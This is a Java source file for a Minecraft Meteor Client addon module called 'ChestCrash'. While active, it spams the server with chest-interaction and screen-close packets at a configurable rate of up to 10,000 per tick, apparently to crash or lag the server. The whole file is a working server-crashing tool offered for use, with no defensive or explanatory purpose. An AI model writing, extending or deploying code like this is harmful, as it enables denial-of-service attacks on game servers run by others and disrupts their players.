package com.client2end.addon.modules;

import com.client2end.addon.Client2End;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;

public class ChestCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packetsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick")
        .description("Packets to send per tick (20 ticks/sec)")
        .defaultValue(1)
        .min(1)
        .max(10000)
        .sliderRange(1, 10000)
        .build()
    );

    private boolean running = false;
    private int ticks = 0;
    private int sent = 0;
    private boolean opening = true;
    private int sequence = 0;

    public ChestCrash() {
        super(Client2End.CATEGORY, "chest-crash", "Chest interact spam with adjustable rate");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!running || mc.player == null || mc.getNetworkHandler() == null) return;

        ticks++;
        int count = packetsPerTick.get();

        if (opening) {
            if (mc.crosshairTarget instanceof BlockHitResult hit) {
                for (int i = 0; i < count; i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, hit, sequence++));
                }
            }
            opening = false;
        } else {
            int syncId = mc.player.currentScreenHandler != null
                ? mc.player.currentScreenHandler.syncId
                : -1;
            if (syncId > 0) {
                for (int i = 0; i < count; i++) {
                    mc.getNetworkHandler().sendPacket(new CloseHandledScreenC2SPacket(syncId));
                }
            }
            opening = true;
        }

        sent += count;
        mc.player.sendMessage(Text.literal("[§4ChestCrash§r] §e" + sent + " §7(" + (count * 20) + "/sec)"), false);
    }

    @Override
    public void onActivate() {
        running = true;
        ticks = 0;
        sent = 0;
        opening = true;
        sequence = 0;
        mc.player.sendMessage(Text.literal("[§4ChestCrash§r] §aLook at chest and toggle"), false);
    }

    @Override
    public void onDeactivate() {
        running = false;
        mc.player.sendMessage(Text.literal("[§4ChestCrash§r] §cTotal: §e" + sent + " §rpackets"), false);
    }
}
